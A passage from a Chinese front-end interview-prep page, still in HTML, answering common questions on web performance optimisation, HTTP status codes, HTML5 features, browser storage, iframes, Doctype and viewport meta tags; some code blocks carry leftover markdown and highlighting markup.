Image</code></li><li>减少<code>DNS</code>查询：<code>DNS</code>缓存、将资源分布到恰当数量的主机名</li><li>减少<code>DOM</code>元素数量</li></ul></li><li><code>Server</code>方面<ul><li>使用<code>CDN</code></li><li>配置<code>ETag</code></li><li>对组件使用<code>Gzip</code>压缩</li></ul></li><li><code>Cookie</code>方面<ul><li>减小<code>cookie</code>大小</li></ul></li><li><code>css</code>方面<ul><li>将样式表放到页面顶部</li><li>不使用<code>CSS</code>表达式</li><li>使用<code>&lt;link&gt;</code>不使用<code>@import</code></li></ul></li><li><code>Javascript</code>方面<ul><li>将脚本放到页面底部</li><li>将<code>javascript</code>和<code>css</code>从外部引入</li><li>压缩<code>javascript</code>和<code>css</code></li><li>删除不需要的脚本</li><li>减少<code>DOM</code>访问</li></ul></li><li>图片方面<ul><li>优化图片：根据实际颜色需要选择色深、压缩</li><li>优化<code>css</code>精灵</li><li>不要在<code>HTML</code>中拉伸图片</li></ul></li></ul><p><strong>你有用过哪些前端性能优化的方法？</strong></p><ul><li>减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。</li><li>前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数</li><li>用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。</li><li>当需要设置的样式很多时设置className而不是直接操作style</li><li>少用全局变量、缓存DOM节点查找的结果。减少IO读取操作</li><li>避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)</li><li>图片预加载，将样式表放在顶部，将脚本放在底部 加上时间戳</li><li>避免在页面的主体布局中使用table，table要等其中的内容完全下载之后才会显示出来，显示比div+css布局慢</li></ul><p><strong>谈谈性能优化问题</strong></p><ul><li>代码层面：避免使用css表达式，避免使用高级选择器，通配选择器</li><li>缓存利用：缓存Ajax，使用CDN，使用外部js和css文件以便缓存，添加Expires头，服务端配置Etag，减少DNS查找等</li><li>请求数量：合并样式和脚本，使用css图片精灵，初始首屏之外的图片资源按需加载，静态资源延迟加载</li><li>请求带宽：压缩文件，开启GZIP</li></ul><p><strong>前端性能优化最佳实践？</strong></p><ul><li>性能评级工具（PageSpeed 或 YSlow）</li><li>合理设置 HTTP 缓存：Expires 与 Cache-control</li><li>静态资源打包，开启 Gzip 压缩（节省响应流量）</li><li>CSS3 模拟图像，图标base64（降低请求数）</li><li>模块延迟(defer)加载/异步(async)加载</li><li>Cookie 隔离（节省请求流量）</li><li>localStorage（本地存储）</li><li>使用 CDN 加速（访问最近服务器）</li><li>启用 HTTP/2（多路复用，并行加载）</li><li>前端自动化（gulp/webpack）</li></ul><h3 id="6-HTTP状态码及其含义"><a href="#6-HTTP状态码及其含义" class="headerlink" title="#6 HTTP状态码及其含义"></a><a href="http://interview.poetries.top/docs/base.html#_6-http%E7%8A%B6%E6%80%81%E7%A0%81%E5%8F%8A%E5%85%B6%E5%90%AB%E4%B9%89">#</a>6 HTTP状态码及其含义</h3><ul><li><div class="hljs code-wrapper"><pre><code>1XX<pre><code class="hljs autohotkey">  ：信息状态码  - `100 <span class="hljs-keyword">Continue</span>` 继续，一般在发送`post`请求时，已发送了`http header`之后服务端将返回此信息，表示确认，之后发送具体参数信息- ```  <span class="hljs-number">2</span>XX</code></pre></div>：成功状态码- `200 OK` 正常返回信息- `201 Created` 请求成功并且服务器创建了新的资源- `202 Accepted` 服务器已接受请求，但尚未处理</code></pre></li><li><div class="hljs code-wrapper"><pre><code>3XX<pre><code class="hljs autohotkey">  ：重定向  - `301 Moved Permanently` 请求的网页已永久移动到新位置。  - `302 Found` 临时性重定向。  - `303 See Other` 临时性重定向，且总是使用 `GET` 请求新的 `URI`。  - `304 <span class="hljs-literal">Not</span> Modified` 自从上次请求后，请求的网页未修改过。- ```  <span class="hljs-number">4</span>XX</code></pre></div>：客户端错误- `400 Bad Request` 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。- `401 Unauthorized` 请求未授权。- `403 Forbidden` 禁止访问。- `404 Not Found` 找不到如何与 `URI` 相匹配的资源。</code></pre></li><li><div class="hljs code-wrapper"><pre><code>5XX:<pre><code class="hljs http">     服务器错误  - `500 Internal Server Error` 最常见的服务器端错误。  - `503 Service Unavailable` 服务器端暂时无法处理请求（可能是过载或维护）。### [#](http://interview.poetries.top/docs/base.html#_7-语义化的理解)7 语义化的理解- 用正确的标签做正确的事情！- `HTML`语义化就是让页面的内容结构化，便于对浏览器、搜索引擎解析；- 在没有样式`CSS`情况下也以一种文档格式显示，并且是容易阅读的。- 搜索引擎的爬虫依赖于标记来确定上下文和各个关键字的权重，利于 `SEO`。- 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解### [#](http://interview.poetries.top/docs/base.html#_8-介绍一下你对浏览器内核的理解)8 介绍一下你对浏览器内核的理解？- 主要分成两部分：渲染引擎(`layout engineer`或`Rendering Engine`)和`JS`引擎- 渲染引擎：负责取得网页的内容（`HTML`、`XML`、图像等等）、整理讯息（例如加入`CSS`等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核- `JS`引擎则：解析和执行`javascript`来实现网页的动态效果- 最开始渲染引擎和`JS`引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎**常见的浏览器内核有哪些**- `Trident`内核：`IE,MaxThon,TT,The World,360`,搜狗浏览器等。[又称MSHTML]- `Gecko`内核：`Netscape6`及以上版本，`FF,MozillaSuite/SeaMonkey`等- `Presto`内核：`Opera7`及以上。 [`Opera`内核原为：Presto，现为：`Blink`;]- `Webkit`内核：`Safari,Chrome`等。 [ `Chrome`的`Blink`（`WebKit`的分支）]### [#](http://interview.poetries.top/docs/base.html#_9-html5有哪些新特性、移除了那些元素)9 html5有哪些新特性、移除了那些元素？- `HTML5` 现在已经不是 `SGML` 的子集，主要是关于图像，位置，存储，多任务等功能的增加  - 新增选择器 `document.querySelector`、`document.querySelectorAll`  - 拖拽释放(`Drag and drop`) API  - 媒体播放的 `video` 和 `audio`  - 本地存储 `localStorage` 和 `sessionStorage`  - 离线应用 `manifest`  - 桌面通知 `Notifications`  - 语意化标签 `article`、`footer`、`header`、`nav`、`section`  - 增强表单控件 `calendar`、`date`、`time`、`email`、`url`、`search`  - 地理位置 `Geolocation`  - 多任务 `webworker`  - 全双工通信协议 `websocket`  - 历史管理 `history`  - 跨域资源共享(CORS) `Access-Control-Allow-Origin`  - 页面可见性改变事件 `visibilitychange`  - 跨窗口通信 `PostMessage`  - `Form Data` 对象  - 绘画 `canvas`- 移除的元素：  - 纯表现的元素：`basefont`、`big`、`center`、`font`、 `s`、`strike`、`tt`、`u`  - 对可用性产生负面影响的元素：`frame`、`frameset`、`noframes`- 支持`HTML5`新标签：  - `IE8/IE7/IE6`支持通过`document.createElement`方法产生的标签  - 可以利用这一特性让这些浏览器支持`HTML5`新标签  - 浏览器支持新标签后，还需要添加标签默认的样式- 当然也可以直接使用成熟的框架、比如`html5shim`**如何区分 HTML 和 HTML5**- `DOCTYPE`声明、新增的结构元素、功能元素### [#](http://interview.poetries.top/docs/base.html#_10-html5的离线储存怎么使用-工作原理能不能解释一下)10 `HTML5`的离线储存怎么使用，工作原理能不能解释一下？- 在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件- 原理：`HTML5`的离线存储是基于一个新建的`.appcache`文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像`cookie`一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示- 如何使用：  - 页面头部像下面一样加入一个`manifest`的属性；  - 在`cache.manifest`文件的编写离线存储的资源  - 在离线状态时，操作`window.applicationCache`进行需求实现```jsonCACHE MANIFEST#v0.11<span class="hljs-attribute">CACHE:</span><span class="hljs-attribute">js/app.js</span><span class="hljs-attribute">css/style.css</span><span class="hljs-attribute">NETWORK:</span><span class="hljs-attribute">resourse/logo.png</span><span class="hljs-attribute">FALLBACK:</span><span class="hljs-attribute">/offline.html</span></code></pre></div></code></pre></li></ul><h3 id="11-浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢"><a href="#11-浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢" class="headerlink" title="#11 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢"></a><a href="http://interview.poetries.top/docs/base.html#_11-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AF%B9html5%E7%9A%84%E7%A6%BB%E7%BA%BF%E5%82%A8%E5%AD%98%E8%B5%84%E6%BA%90%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86%E5%92%8C%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%91%A2">#</a>11 浏览器是怎么对<code>HTML5</code>的离线储存资源进行管理和加载的呢</h3><ul><li>在线的情况下，浏览器发现<code>html</code>头部有<code>manifest</code>属性，它会请求<code>manifest</code>文件，如果是第一次访问<code>app</code>，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过<code>app</code>并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的<code>manifest</code>文件与旧的<code>manifest</code>文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。</li><li>离线的情况下，浏览器就直接使用离线存储的资源。</li></ul><h3 id="12-请描述一下-cookies，sessionStorage-和-localStorage-的区别？"><a href="#12-请描述一下-cookies，sessionStorage-和-localStorage-的区别？" class="headerlink" title="#12 请描述一下 cookies，sessionStorage 和 localStorage 的区别？"></a><a href="http://interview.poetries.top/docs/base.html#_12-%E8%AF%B7%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%8B-cookies-sessionstorage-%E5%92%8C-localstorage-%E7%9A%84%E5%8C%BA%E5%88%AB">#</a>12 请描述一下 <code>cookies</code>，<code>sessionStorage</code> 和 <code>localStorage</code> 的区别？</h3><ul><li><code>cookie</code>是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）</li><li>cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递</li><li><code>sessionStorage</code>和<code>localStorage</code>不会自动把数据发给服务器，仅在本地保存</li><li>存储大小：<ul><li><code>cookie</code>数据大小不能超过4k</li><li><code>sessionStorage</code>和<code>localStorage</code>虽然也有存储大小的限制，但比<code>cookie</code>大得多，可以达到5M或更大</li></ul></li><li>有期时间：<ul><li><code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据</li><li><code>sessionStorage</code> 数据在当前浏览器窗口关闭后自动删除</li><li><code>cookie</code> 设置的<code>cookie</code>过期时间之前一直有效，即使窗口或浏览器关闭</li></ul></li></ul><h3 id="13-iframe有那些缺点？"><a href="#13-iframe有那些缺点？" class="headerlink" title="#13 iframe有那些缺点？"></a><a href="http://interview.poetries.top/docs/base.html#_13-iframe%E6%9C%89%E9%82%A3%E4%BA%9B%E7%BC%BA%E7%82%B9">#</a>13 iframe有那些缺点？</h3><ul><li><code>iframe</code>会阻塞主页面的<code>Onload</code>事件</li><li>搜索引擎的检索程序无法解读这种页面，不利于<code>SEO</code></li><li><code>iframe</code>和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载</li><li>使用<code>iframe</code>之前需要考虑这两个缺点。如果需要使用<code>iframe</code>，最好是通过<code>javascript</code>动态给<code>iframe</code>添加<code>src</code>属性值，这样可以绕开以上两个问题</li></ul><h3 id="14-WEB标准以及W3C标准是什么"><a href="#14-WEB标准以及W3C标准是什么" class="headerlink" title="#14 WEB标准以及W3C标准是什么?"></a><a href="http://interview.poetries.top/docs/base.html#_14-web%E6%A0%87%E5%87%86%E4%BB%A5%E5%8F%8Aw3c%E6%A0%87%E5%87%86%E6%98%AF%E4%BB%80%E4%B9%88">#</a>14 WEB标准以及W3C标准是什么?</h3><ul><li>标签闭合、标签小写、不乱嵌套、使用外链<code>css</code>和<code>js</code>、结构行为表现的分离</li></ul><h3 id="15-xhtml和html有什么区别"><a href="#15-xhtml和html有什么区别" class="headerlink" title="#15 xhtml和html有什么区别?"></a><a href="http://interview.poetries.top/docs/base.html#_15-xhtml%E5%92%8Chtml%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">#</a>15 xhtml和html有什么区别?</h3><ul><li>一个是功能上的差别<ul><li>主要是<code>XHTML</code>可兼容各大浏览器、手机以及<code>PDA</code>，并且浏览器也能快速正确地编译网页</li></ul></li><li>另外是书写习惯的差别<ul><li><code>XHTML</code> 元素必须被正确地嵌套，闭合，区分大小写，文档必须拥有根元素</li></ul></li></ul><h3 id="16-Doctype作用-严格模式与混杂模式如何区分？它们有何意义"><a href="#16-Doctype作用-严格模式与混杂模式如何区分？它们有何意义" class="headerlink" title="#16 Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?"></a><a href="http://interview.poetries.top/docs/base.html#_16-doctype%E4%BD%9C%E7%94%A8-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86-%E5%AE%83%E4%BB%AC%E6%9C%89%E4%BD%95%E6%84%8F%E4%B9%89">#</a>16 Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</h3><ul><li>页面被加载的时，<code>link</code>会同时被加载，而<code>@imort</code>页面被加载的时，<code>link</code>会同时被加载，而<code>@import</code>引用的<code>CSS</code>会等到页面被加载完再加载 <code>import</code>只在<code>IE5</code>以上才能识别，而<code>link</code>是<code>XHTML</code>标签，无兼容问题 <code>link</code>方式的样式的权重 高于<code>@import</code>的权重</li><li><code>&lt;!DOCTYPE&gt;</code> 声明位于文档中的最前面，处于 <code>&lt;html&gt;</code> 标签之前。告知浏览器的解析器， 用什么文档类型 规范来解析这个文档</li><li>严格模式的排版和 <code>JS</code> 运作模式是 以该浏览器支持的最高标准运行</li><li>在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 <code>DOCTYPE</code>不存在或格式不正确会导致文档以混杂模式呈现</li></ul><h3 id="17-行内元素有哪些？块级元素有哪些？-空-void-元素有那些？行内元素和块级元素有什么区别？"><a href="#17-行内元素有哪些？块级元素有哪些？-空-void-元素有那些？行内元素和块级元素有什么区别？" class="headerlink" title="#17 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？"></a><a href="http://interview.poetries.top/docs/base.html#_17-%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0%E6%9C%89%E5%93%AA%E4%BA%9B-%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E6%9C%89%E5%93%AA%E4%BA%9B-%E7%A9%BA-void-%E5%85%83%E7%B4%A0%E6%9C%89%E9%82%A3%E4%BA%9B-%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0%E5%92%8C%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">#</a>17 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？行内元素和块级元素有什么区别？</h3><ul><li>行内元素有：<code>a b span img input select strong</code></li><li>块级元素有：<code>div ul ol li dl dt dd h1 h2 h3 h4… p</code></li><li>空元素：<code>&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;input&gt; &lt;link&gt; &lt;meta&gt;</code></li><li>行内元素不可以设置宽高，不独占一行</li><li>块级元素可以设置宽高，独占一行</li></ul><h3 id="18-HTML全局属性-global-attribute-有哪些"><a href="#18-HTML全局属性-global-attribute-有哪些" class="headerlink" title="#18 HTML全局属性(global attribute)有哪些"></a><a href="http://interview.poetries.top/docs/base.html#_18-html%E5%85%A8%E5%B1%80%E5%B1%9E%E6%80%A7-global-attribute-%E6%9C%89%E5%93%AA%E4%BA%9B">#</a>18 HTML全局属性(global attribute)有哪些</h3><ul><li><code>class</code>:为元素设置类标识</li><li><code>data-*</code>: 为元素增加自定义属性</li><li><code>draggable</code>: 设置元素是否可拖拽</li><li><code>id</code>: 元素<code>id</code>，文档内唯一</li><li><code>lang</code>: 元素内容的的语言</li><li><code>style</code>: 行内<code>css</code>样式</li><li><code>title</code>: 元素相关的建议信息</li></ul><h3 id="19-Canvas和SVG有什么区别？"><a href="#19-Canvas和SVG有什么区别？" class="headerlink" title="#19 Canvas和SVG有什么区别？"></a><a href="http://interview.poetries.top/docs/base.html#_19-canvas%E5%92%8Csvg%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">#</a>19 Canvas和SVG有什么区别？</h3><ul><li><code>svg</code>绘制出来的每一个图形的元素都是独立的<code>DOM</code>节点，能够方便的绑定事件或用来修改。<code>canvas</code>输出的是一整幅画布</li><li><code>svg</code>输出的图形是矢量图形，后期可以修改参数来自由放大缩小，不会失真和锯齿。而<code>canvas</code>输出标量画布，就像一张图片一样，放大会失真或者锯齿</li></ul><h3 id="20-HTML5-为什么只需要写"><a href="#20-HTML5-为什么只需要写" class="headerlink" title="#20 HTML5 为什么只需要写 "></a><a href="http://interview.poetries.top/docs/base.html#_20-html5-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AA%E9%9C%80%E8%A6%81%E5%86%99">#</a>20 HTML5 为什么只需要写 <!DOCTYPE HTML></h3><ul><li><code>HTML5</code> 不基于 <code>SGML</code>，因此不需要对<code>DTD</code>进行引用，但是需要<code>doctype</code>来规范浏览器的行为</li><li>而<code>HTML4.01</code>基于<code>SGML</code>,所以需要对<code>DTD</code>进行引用，才能告知浏览器文档所使用的文档类型</li></ul><h3 id="21-如何在页面上实现一个圆形的可点击区域？"><a href="#21-如何在页面上实现一个圆形的可点击区域？" class="headerlink" title="#21 如何在页面上实现一个圆形的可点击区域？"></a><a href="http://interview.poetries.top/docs/base.html#_21-%E5%A6%82%E4%BD%95%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%8A%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%9C%86%E5%BD%A2%E7%9A%84%E5%8F%AF%E7%82%B9%E5%87%BB%E5%8C%BA%E5%9F%9F">#</a>21 如何在页面上实现一个圆形的可点击区域？</h3><ul><li><code>svg</code></li><li><code>border-radius</code></li><li>纯<code>js</code>实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等</li></ul><h3 id="22-网页验证码是干嘛的，是为了解决什么安全问题"><a href="#22-网页验证码是干嘛的，是为了解决什么安全问题" class="headerlink" title="#22 网页验证码是干嘛的，是为了解决什么安全问题"></a><a href="http://interview.poetries.top/docs/base.html#_22-%E7%BD%91%E9%A1%B5%E9%AA%8C%E8%AF%81%E7%A0%81%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84-%E6%98%AF%E4%B8%BA%E4%BA%86%E8%A7%A3%E5%86%B3%E4%BB%80%E4%B9%88%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">#</a>22 网页验证码是干嘛的，是为了解决什么安全问题</h3><ul><li>区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水</li><li>有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试</li></ul><h3 id="23-viewport"><a href="#23-viewport" class="headerlink" title="#23 viewport"></a><a href="http://interview.poetries.top/docs/base.html#_23-viewport">#</a>23 viewport</h3><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no&quot;</span> /&gt;    <span class="hljs-comment">// width    设置viewport宽度，为一个正整数，或字符串‘device-width’    // device-width  设备宽度    // height   设置viewport高度，一般设置了宽度，会自动解析出高度，可以不用设置    // initial-scale    默认缩放比例（初始缩放比例），为一个数字，可以带小数    // minimum-scale    允许用户最小缩放比例，为一个数字，可以带小数    // maximum-scale    允许用户最大缩放比例，为一个数字，可以带小数    // user-scalable    是否允许手动缩放</span></code></pre></div><ul><li>延伸提问<ul><li>怎样处理 移动端 <code>1px</code> 被 渲染成 <code>2px</code>问题</li></ul></li></ul><p><strong>局部处理</strong></p><ul><li><code>meta</code>标签中的 <code>viewport</code>属性 ，<code>initial-scale</code> 设置为 <code>1</code></li><li><code>rem</code>按照设计稿标准走，外加利用<code>transfrome</code> 的<code>scale(0.5)</code> 缩小一倍即可；</li></ul><p><strong>全局处理</strong></p><ul><li><code>mate</code>标签中的 <code>viewport</code>属性 ，<code>initial-scale</code> 设置为 <code>0.5</code></li><li><code>rem</code> 按照设计稿标准走即可</li></ul><h3 id="24-渲染优化"><a href="#24-渲染优化" class="headerlink" title="#24 渲染优化"></a><a href="http://interview.poetries.top/docs/base.html#_24-%E6%B8%B2%E6%9F%93%E4%BC%98%E5%8C%96">#</a>24 渲染优化</h3><ul><li>禁止使用<code>iframe</code>（阻塞父文档<code>onload</code>事件）<ul><li><code>iframe</code>会阻塞主页面的<code>Onload</code>事件</li><li>搜索引擎的检索程序无法解读这种页面，不利于SEO</li><li><code>iframe</code>和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载</li><li>使用<code>iframe</code>之前需要考虑这两个缺点。如果需要使用<code>iframe</code>，最好是通过<code>javascript</code></li><li>动态给<code>iframe</code>添加<code>src</code>属性值，这样可以绕开以上两个问题</li></ul></li><li>禁止使用<code>gif</code>图片实现<code>loading</code>效果（降低<code>CPU</code>消耗，提升渲染性能）</li><li>使用<code>CSS3</code>代码代替<code>JS</code>动画（尽可能避免重绘重排以及回流）</li><li>对于一些小图标，可以使用base64位编码，以减少网络请求。但不建议大图使用，比较耗费<code>CPU</code><ul><li>小图标优势在于<ul><li>减少<code>HTTP</code>请求</li><li>避免文件跨域</li><li>修改及时生效</li></ul></li></ul></li><li>页面头部的<code>&lt;style&gt;&lt;/style&gt;</code> <code>&lt;script&gt;&lt;/script&gt;</code> 会阻塞页面；（因为 <code>Renderer</code>进程中 <code>JS</code>线程和渲染线程是互斥的）</li><li>页面中空的 <code>href</code> 和 <code>src</code> 会阻塞页面其他资源的加载 (阻塞下载进程)</li><li>网页<code>gzip</code>，<code>CDN</code>托管，<code>data</code>缓存 ，图片服务器</li><li>前端模板 JS+数据，减少由于<code>HTML</code>标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数</li><li>用<code>innerHTML</code>代替<code>DOM</code>操作，减少<code>DOM</code>操作次数，优化<code>javascript</code>性能</li><li>当需要设置的样式很多时设置<code>className</code>而不是直接操作<code>style</code></li><li>少用全局变量、缓存<code>DOM</code>节点查找的结果。减少<code>IO</code>读取操作</li><li>图片预加载，将样式表放在顶部，将脚本放在底部 加上时间戳</li><li>对普通的网站有一个统一的思路，就是尽量向前端优化、减少数据库操作、减少磁盘<code>IO</code></li></ul><h3 id="25-meta-viewport相关"><a href="#25-meta-viewport相关" class="headerlink" title="#25 meta viewport相关"></a><a href="http://interview.poetries.top/docs/base.html#_25-meta-viewport%E7%9B%B8%E5%85%B3">#</a>25 meta viewport相关</h3><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>  <span class="hljs-comment">&lt;!--H5标准声明，使用 HTML5 doctype，不区分大小写--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">”en”</span>&gt;</span> <span class="hljs-comment">&lt;!--标准的 lang 属性写法--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">’utf-8′</span>&gt;</span>    <span class="hljs-comment">&lt;!--声明文档使用的字符编码--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">”X-UA-Compatible”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”IE</span>=<span class="hljs-string">edge,chrome</span>=<span class="hljs-string">1″/</span>&gt;</span>   <span class="hljs-comment">&lt;!--优先使用 IE 最新版本和 Chrome--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”description”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”不超过150个字符”/</span>&gt;</span>       <span class="hljs-comment">&lt;!--页面描述--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”keywords”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">””/</span>&gt;</span>     <span class="hljs-comment">&lt;!-- 页面关键词--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”author”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”name,</span> <span class="hljs-attr">email</span>@<span class="hljs-attr">gmail.com</span>”/&gt;</span>    <span class="hljs-comment">&lt;!--网页作者--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”robots”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”index,follow”/</span>&gt;</span>      <span class="hljs-comment">&lt;!--搜索引擎抓取--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”viewport”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”initial-scale</span>=<span class="hljs-string">1,</span> <span class="hljs-attr">maximum-scale</span>=<span class="hljs-string">3,</span> <span class="hljs-attr">minimum-scale</span>=<span class="hljs-string">1,</span> <span class="hljs-attr">user-scalable</span>=<span class="hljs-string">no”</span>&gt;</span> <span class="hljs-comment">&lt;!--为移动设备添加 viewport--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”apple-mobile-web-app-title”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”标题”</span>&gt;</span> <span class="hljs-comment">&lt;!--iOS 设备 begin--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”apple-mobile-web-app-capable”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”yes”/</span>&gt;</span>  <span class="hljs-comment">&lt;!--添加到主屏后的标题（iOS 6 新增）是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”apple-itunes-app”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”app-id</span>=<span class="hljs-string">myAppStoreID,</span> <span class="hljs-attr">affiliate-data</span>=<span class="hljs-string">myAffiliateData,</span> <span class="hljs-attr">app-argument</span>=<span class="hljs-string">myURL”</span>&gt;</span><span class="hljs-comment">&lt;!--添加智能 App 广告条 Smart App Banner（iOS 6+ Safari）--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”apple-mobile-web-app-status-bar-style”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”black”/</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”format-detection”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”telphone</span>=<span class="hljs-string">no,</span> <span class="hljs-attr">email</span>=<span class="hljs-string">no”/</span>&gt;</span>  <span class="hljs-comment">&lt;!--设置苹果工具栏颜色--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”renderer”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”webkit”</span>&gt;</span> <span class="hljs-comment">&lt;!-- 启用360浏览器的极速模式(webkit)--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">”X-UA-Compatible”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”IE</span>=<span class="hljs-string">edge”</span>&gt;</span>     <span class="hljs-comment">&lt;!--避免IE使用兼容模式--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">”Cache-Control”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”no-siteapp”</span> /&gt;</span>    <span class="hljs-comment">&lt;!--不让百度转码--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”HandheldFriendly”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”true”</span>&gt;</span>     <span class="hljs-comment">&lt;!--针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”MobileOptimized”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”320″</span>&gt;</span>   <span class="hljs-comment">&lt;!--微软的老式浏览器--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">”screen-orientation”</span> <span class="hljs-attr">content</span>=<span class="hljs-string">”portrait”</span>&gt;</span>   <span class="hljs-comment">&lt;!--uc强制竖屏--&gt;</span><span 